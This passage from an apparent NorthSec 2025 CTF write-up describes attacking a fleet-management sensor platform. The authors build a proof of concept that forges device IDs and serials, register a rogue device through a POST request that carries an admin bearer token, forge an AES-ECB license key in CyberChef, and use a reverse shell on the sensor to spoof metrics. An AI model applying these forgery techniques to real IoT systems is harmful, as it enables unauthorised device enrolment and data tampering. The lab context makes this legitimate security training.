+<a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a>        <span class="k">return</span> <span class="n">hmac_obj</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+<a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a>
+<a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a>    <span class="nd">@computed_field</span><span class="p">(</span><span class="n">return_type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
+<a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a>    <span class="nd">@property</span>
+<a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">serial</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a>        <span class="n">mac</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">mac</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+<a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a>        <span class="n">base_serial</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">model</span><span class="si">}{</span><span class="n">mac</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span><span class="si">}</span><span class="s2">-</span><span class="si">{</span><span class="n">mac</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">6</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span>
+<a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a>        <span class="n">checksum</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">base_serial</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="nb">int</span><span class="p">(</span><span class="n">base_serial</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="mi">9</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<a id="__codelineno-15-35" name="__codelineno-15-35" href="#__codelineno-15-35"></a>        <span class="k">if</span> <span class="n">checksum</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+<a id="__codelineno-15-36" name="__codelineno-15-36" href="#__codelineno-15-36"></a>            <span class="n">checksum</span> <span class="o">=</span> <span class="n">checksum</span> <span class="o">*</span> <span class="o">-</span><span class="mi">1</span>
+<a id="__codelineno-15-37" name="__codelineno-15-37" href="#__codelineno-15-37"></a>        <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">base_serial</span><span class="si">}</span><span class="s2">-</span><span class="si">{</span><span class="n">checksum</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+<a id="__codelineno-15-38" name="__codelineno-15-38" href="#__codelineno-15-38"></a>
+<a id="__codelineno-15-39" name="__codelineno-15-39" href="#__codelineno-15-39"></a><span class="p">[</span><span class="o">...</span><span class="p">]</span>
+<a id="__codelineno-15-40" name="__codelineno-15-40" href="#__codelineno-15-40"></a>
+<a id="__codelineno-15-41" name="__codelineno-15-41" href="#__codelineno-15-41"></a><span class="nd">@http_wrap</span><span class="p">(</span><span class="n">error_value</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+<a id="__codelineno-15-42" name="__codelineno-15-42" href="#__codelineno-15-42"></a><span class="k">def</span><span class="w"> </span><span class="nf">register_device</span><span class="p">(</span><span class="n">device</span><span class="p">:</span> <span class="n">DeviceConfiguration</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+<a id="__codelineno-15-43" name="__codelineno-15-43" href="#__codelineno-15-43"></a>    <span class="n">conf</span> <span class="o">=</span> <span class="n">device</span><span class="o">.</span><span class="n">model_dump</span><span class="p">(</span><span class="n">mode</span><span class="o">=</span><span class="s2">&quot;json&quot;</span><span class="p">,</span> <span class="n">exclude</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;model&quot;</span><span class="p">,</span> <span class="s2">&quot;interface&quot;</span><span class="p">})</span>
+<a id="__codelineno-15-44" name="__codelineno-15-44" href="#__codelineno-15-44"></a>    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+<a id="__codelineno-15-45" name="__codelineno-15-45" href="#__codelineno-15-45"></a>        <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/register/&quot;</span><span class="p">,</span>
+<a id="__codelineno-15-46" name="__codelineno-15-46" href="#__codelineno-15-46"></a>        <span class="n">json</span><span class="o">=</span><span class="n">conf</span><span class="p">,</span>
+<a id="__codelineno-15-47" name="__codelineno-15-47" href="#__codelineno-15-47"></a>        <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+<a id="__codelineno-15-48" name="__codelineno-15-48" href="#__codelineno-15-48"></a>        <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+<a id="__codelineno-15-49" name="__codelineno-15-49" href="#__codelineno-15-49"></a>    <span class="p">)</span>
+<a id="__codelineno-15-50" name="__codelineno-15-50" href="#__codelineno-15-50"></a>    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">201</span><span class="p">:</span>
+<a id="__codelineno-15-51" name="__codelineno-15-51" href="#__codelineno-15-51"></a>        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Device registered successfully&quot;</span><span class="p">)</span>
+<a id="__codelineno-15-52" name="__codelineno-15-52" href="#__codelineno-15-52"></a>        <span class="k">return</span> <span class="kc">True</span>
+<a id="__codelineno-15-53" name="__codelineno-15-53" href="#__codelineno-15-53"></a>    <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-15-54" name="__codelineno-15-54" href="#__codelineno-15-54"></a>        <span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span>
+<a id="__codelineno-15-55" name="__codelineno-15-55" href="#__codelineno-15-55"></a>            <span class="sa">f</span><span class="s2">&quot;Device registration failed: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2"> - </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&quot;</span>
+<a id="__codelineno-15-56" name="__codelineno-15-56" href="#__codelineno-15-56"></a>        <span class="p">)</span>
+<a id="__codelineno-15-57" name="__codelineno-15-57" href="#__codelineno-15-57"></a>        <span class="k">return</span> <span class="kc">False</span>
+<a id="__codelineno-15-58" name="__codelineno-15-58" href="#__codelineno-15-58"></a>
+<a id="__codelineno-15-59" name="__codelineno-15-59" href="#__codelineno-15-59"></a><span class="p">[</span><span class="o">...</span><span class="p">]</span>
+</code></pre></div>
+<p>The <code>register_device</code> function is giving us all the details we need to craft a <code>POST</code> request to register our own device.</p>
+<p>Let's take some part of the code to create our own proof-of-concept. The idea of the PoC is to generate the right values for our new device:</p>
+<ul>
+<li>The <code>machine_id</code> value is read from a file on the sensor. Since we do not have a <em>real</em> sensor, we just put a random value. The value just needs to respect the specifications.</li>
+<li>The <code>mac_addr</code> value is the MAC address of the sensor. Again we do not have a <em>real</em> sensor, so we just put a random MAC address.</li>
+</ul>
+<p>We are just using the code of the original <code>py</code> file to generate the <code>device_id</code> and the <code>serial</code> fields:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Hash</span><span class="w"> </span><span class="kn">import</span> <span class="n">HMAC</span><span class="p">,</span> <span class="n">SHA256</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">machine_id</span> <span class="o">=</span> <span class="s2">&quot;99999999999999999999999999999999&quot;</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="n">mac_addr</span> <span class="o">=</span> <span class="s2">&quot;00:18:55:ea:62:10&quot;</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="c1"># device_id</span>
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="n">hmac_obj</span> <span class="o">=</span> <span class="n">HMAC</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">mac_addr</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">SHA256</span><span class="p">)</span>
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="n">hmac_obj</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">machine_id</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>
+<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="c1"># serial</span>
+<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>
+<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="n">mac</span> <span class="o">=</span> <span class="n">mac_addr</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+<a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="n">base_serial</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;e4</span><span class="si">{</span><span class="n">mac</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span><span class="si">}</span><span class="s2">-</span><span class="si">{</span><span class="n">mac</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">6</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span>
+<a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a><span class="n">checksum</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">base_serial</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="nb">int</span><span class="p">(</span><span class="n">base_serial</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="mi">9</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a><span class="k">if</span> <span class="n">checksum</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+<a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a>    <span class="n">checksum</span> <span class="o">=</span> <span class="n">checksum</span> <span class="o">*</span> <span class="o">-</span><span class="mi">1</span>
+<a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a>
+<a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a><span class="nb">print</span><span class="p">(</span><span class="n">hmac_obj</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>
+<a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a><span class="nb">print</span><span class="p">(</span><span class="n">checksum</span><span class="p">)</span>
+</code></pre></div>
+<p>We ran the PoC:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="p">$</span> <span class="n">python3</span> <span class="n">poc</span><span class="p">.</span><span class="n">py</span> 
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="n">59650d62169c4a187f047c084286c3c3f9ba39b71e99b43ca7bbea7cd7c07b51</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="n">33498</span>
+</code></pre></div>
+<p>We reused those values for the <code>POST</code> request:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">POST</span> <span class="p">/</span><span class="n">api</span><span class="p">/</span><span class="n">register</span><span class="p">/</span> <span class="n">HTTP</span><span class="p">/</span><span class="n">1</span><span class="p">.</span><span class="n">1</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">Host</span><span class="p">:</span> <span class="n">dashboard</span><span class="p">.</span><span class="n">fms</span><span class="p">.</span><span class="n">ctf</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="n">Authorization</span><span class="p">:</span> <span class="n">Bearer</span> <span class="n">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="p">.</span><span class="n">eyJzdWIiOiJhZG1pbkBmbXMuY3RmIiwiYWRtaW4iOnRydWUsImV4cCI6MTc0NzQ5Njk2NH0</span><span class="p">.</span><span class="n">aIW3WIKuG2rhPmCWx2T7E2v58R8m4T2wvTuyT-bUwDw</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="n">User-Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="p">/</span><span class="n">5</span><span class="p">.</span><span class="n">0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">x86_64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="n">138</span><span class="p">.</span><span class="n">0</span><span class="p">)</span> <span class="n">Gecko</span><span class="p">/</span><span class="n">20100101</span> <span class="n">Firefox</span><span class="p">/</span><span class="n">138</span><span class="p">.</span><span class="n">0</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="n">Accept</span><span class="p">:</span> <span class="n">application</span><span class="p">/</span><span class="n">json</span>
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="n">Accept-Language</span><span class="p">:</span> <span class="n">en-US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">5</span>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="n">Content-Type</span><span class="p">:</span> <span class="n">application</span><span class="p">/</span><span class="n">json</span>
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="n">Content-Length</span><span class="p">:</span> <span class="n">235</span>
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>
+<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="p">{</span>
+<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>  <span class="s2">&quot;device_id&quot;</span><span class="p">:</span> <span class="s2">&quot;59650d62169c4a187f047c084286c3c3f9ba39b71e99b43ca7bbea7cd7c07b51&quot;</span><span class="p">,</span>
+<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>  <span class="s2">&quot;serial&quot;</span><span class="p">:</span> <span class="s2">&quot;e4ea-6210-33498&quot;</span><span class="p">,</span>
+<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>  <span class="s2">&quot;machine_id&quot;</span><span class="p">:</span> <span class="s2">&quot;99999999999999999999999999999999&quot;</span><span class="p">,</span>
+<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>  <span class="s2">&quot;ip&quot;</span><span class="p">:</span> <span class="s2">&quot;fe80::a471:c9ff:feea:6210&quot;</span><span class="p">,</span>
+<a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>  <span class="s2">&quot;mac&quot;</span><span class="p">:</span> <span class="s2">&quot;00:18:55:ea:62:10&quot;</span>
+<a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="p">}</span>
+</code></pre></div>
+<p>It worked:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">HTTP</span><span class="p">/</span><span class="n">1</span><span class="p">.</span><span class="n">1</span> <span class="n">200</span> <span class="n">OK</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">Server</span><span class="p">:</span> <span class="n">nginx</span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="n">Date</span><span class="p">:</span> <span class="n">Sat</span><span class="p">,</span> <span class="n">17</span> <span class="n">May</span> <span class="n">2025</span> <span class="n">17</span><span class="p">:</span><span class="n">46</span><span class="p">:</span><span class="n">26</span> <span class="n">GMT</span>
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="n">Content-Type</span><span class="p">:</span> <span class="n">application</span><span class="p">/</span><span class="n">json</span>
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="n">Content-Length</span><span class="p">:</span> <span class="n">315</span>
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="n">Connection</span><span class="p">:</span> <span class="n">keep-alive</span>
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="p">{</span>
+<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>    <span class="s2">&quot;ip&quot;</span><span class="p">:</span><span class="s2">&quot;fe80::a471:c9ff:feea:6210&quot;</span><span class="p">,</span>
+<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>    <span class="s2">&quot;serial&quot;</span><span class="p">:</span><span class="s2">&quot;e4ea-6210-33498&quot;</span><span class="p">,</span>
+<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>    <span class="s2">&quot;machine_id&quot;</span><span class="p">:</span><span class="s2">&quot;99999999999999999999999999999999&quot;</span><span class="p">,</span>
+<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>    <span class="s2">&quot;last_seen&quot;</span><span class="p">:</span><span class="s2">&quot;2025-05-16T13:31:05.016958&quot;</span><span class="p">,</span>
+<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>    <span class="s2">&quot;device_id&quot;</span><span class="p">:</span><span class="s2">&quot;59650d62169c4a187f047c084286c3c3f9ba39b71e99b43ca7bbea7cd7c07b51&quot;</span><span class="p">,</span>
+<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>    <span class="s2">&quot;mac&quot;</span><span class="p">:</span><span class="s2">&quot;00:18:55:ea:62:10&quot;</span><span class="p">,</span>
+<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>    <span class="s2">&quot;first_seen&quot;</span><span class="p">:</span><span class="s2">&quot;2025-05-16T13:31:05.016888&quot;</span><span class="p">,</span>
+<a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>    <span class="s2">&quot;activated&quot;</span><span class="p">:</span><span class="n">false</span>
+<a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a><span class="p">}</span>
+</code></pre></div>
+<p>We found a new device, and a new flag on the user interface:</p>
+<p><img alt="New device registered" src="../res/nsec25/new-device.png" /></p>
+<p>Let's send the flag:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="p">$</span> <span class="p">/</span><span class="n">snap</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">askgod</span> <span class="n">submit</span> <span class="n">FLAG</span><span class="p">-</span><span class="n">2e852a0da786c246475ad34e8ac348c167675be0</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="n">Congratulations</span><span class="p">,</span> <span class="n">you</span> <span class="n">score</span> <span class="n">your</span> <span class="n">team</span> <span class="n">2</span> <span class="n">points</span><span class="p">!</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="n">Message</span><span class="p">:</span> <span class="n">New</span> <span class="n">sensor</span> <span class="n">detected</span> <span class="n">4</span><span class="p">/</span><span class="n">6</span>
+</code></pre></div>
+<p>And grab the next hint:</p>
+<p><img alt="Fourth hint" src="../res/nsec25/fourth-hint.png" /></p>
+<h3 id="where-is-my-license">Where is my license</h3>
+<p>Now that we have a new sensor, we need to add a license on it to be able to enable it.</p>
+<p>After trying some value on the license, we got the following errors:</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Error</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>V</code></td>
+<td><code>Value error, non-hexadecimal number found in fromhex() arg at position 0</code></td>
+</tr>
+<tr>
+<td><code>AAAA</code></td>
+<td><code>Value error, Data must be aligned to block boundary in ECB mode</code></td>
+</tr>
+<tr>
+<td><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></td>
+<td><code>Data not padded</code></td>
+</tr>
+</tbody>
+</table>
+<p>We learned that:</p>
+<ul>
+<li>It is only hexadecimal</li>
+<li>The <code>ECB</code> mode is used</li>
+<li>The data is padded</li>
+</ul>
+<p>The request used to create a license key is the following:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="p">{</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="w">  </span><span class="nt">&quot;tenant_id&quot;</span><span class="p">:</span><span class="s2">&quot;b66a84fc-d6b7-455f-a010-c558adc6d4a8&quot;</span><span class="p">,</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="w">  </span><span class="nt">&quot;license_key&quot;</span><span class="p">:</span><span class="s2">&quot;bd04fe25c7eb9bbfd33e8[...]c56ddf59a730e167210552aaf31d31cb1517a8d92ef17&quot;</span>
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="p">}</span>
+</code></pre></div>
+<p>So we can assume that the <code>tenant_id</code> is used to encrypt and decrypt the <code>license_key</code>.</p>
+<p>After some failures, we are able to decrypt one of the license key with <a href="https://gchq.github.io/CyberChef/"><code>CyberChef</code></a>:</p>
+<p><img alt="CyberChef is your friend" src="../res/nsec25/dechiffrement-cle-license.png" /></p>
+<p>Since we are able to decrypt, we should be able to encrypt the data. However for a long time, we were not able to get a proper license key using a decent <code>JSON</code> snippet.</p>
+<p>We found that adding 10 spaces at our decent <code>JSON</code> snippet is making it decent enough to match a valid license key format:</p>
+<p><img alt="CyberChef is still your friend" src="../res/nsec25/chiffrement-cle-license.png" /></p>
+<p>Let's add our new license:</p>
+<p><img alt="The new license" src="../res/nsec25/new-license.png" /></p>
+<p>It appear on the user interface with a new flag:</p>
+<p><img alt="License added" src="../res/nsec25/ajout-cle-license.png" /></p>
+<p>The hint:</p>
+<p><img alt="Fifth hint" src="../res/nsec25/fifth-hint.png" /></p>
+<h3 id="kpi-kpi-kpi">KPI KPI KPI</h3>
+<p>Our understanding was that we have to put the metrics of <code>fuel</code> and <code>consumption</code> at zero for both of the sensors:</p>
+<p><img alt="The dashboard" src="../res/nsec25/dashboard.png" /></p>
+<p>Let's have a look on the <code>update_fuel_consumption</code> function:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nd">@http_wrap</span><span class="p">(</span><span class="n">error_value</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">update_fuel_consumption</span><span class="p">(</span><span class="n">consumption</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">device</span><span class="p">:</span> <span class="n">DeviceConfiguration</span><span class="p">):</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>        <span class="s2">&quot;device_id&quot;</span><span class="p">:</span> <span class="n">device</span><span class="o">.</span><span class="n">device_id</span><span class="p">,</span>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>        <span class="s2">&quot;sensor_id&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>        <span class="s2">&quot;sensor_data&quot;</span><span class="p">:</span> <span class="nb">hex</span><span class="p">(</span><span class="n">consumption</span><span class="p">),</span>
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>        <span class="s2">&quot;sensor_type&quot;</span><span class="p">:</span> <span class="s2">&quot;consumption&quot;</span><span class="p">,</span>
+<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>        <span class="s2">&quot;timestamp&quot;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">(</span><span class="n">timezone</span><span class="o">.</span><span class="n">utc</span><span class="p">)</span><span class="o">.</span><span class="n">isoformat</span><span class="p">(),</span>
+<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>    <span class="p">}</span>
+<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a>    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+<a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a>        <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/metrics/&quot;</span><span class="p">,</span>
+<a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a>        <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span>
+<a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a>        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">,</span> <span class="s2">&quot;X-Token&quot;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid1</span><span class="p">())},</span>
+<a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a>        <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+<a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a>    <span class="p">)</span>
+<a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a>    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Fuel consumption - updated to </span><span class="si">{</span><span class="n">consumption</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+<p>So we just need to generate two values:</p>
+<ul>
+<li><code>timestamp</code> : We can just reuse the code used in the function</li>
+<li><code>X-Token</code> : We can generate it directory on the sensor since we have a RCE on it. We can also use the tool we modified for the second flag.</li>
+</ul>
+<p>Let's start by the sensor number one.</p>
+<p>We choose to generate the <code>UUID</code> using the reverse shell:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import uuid; print(str(uuid.uuid1()))&quot;</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="mf">6e15</span><span class="n">c755</span><span class="o">-</span><span class="mf">38e4</span><span class="o">-</span><span class="mi">11</span><span class="n">f0</span><span class="o">-</span><span class="mi">8</span><span class="n">d8b</span><span class="o">-</span><span class="mi">00185594</span><span class="n">ec1a</span>
+</code></pre></div>
+<p>And we can generate the <code>timestamp</code> on our own computer using this one-liner:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;from datetime import datetime, timezone; print(datetime.now(timezone.utc).isoformat())&quot;</span>
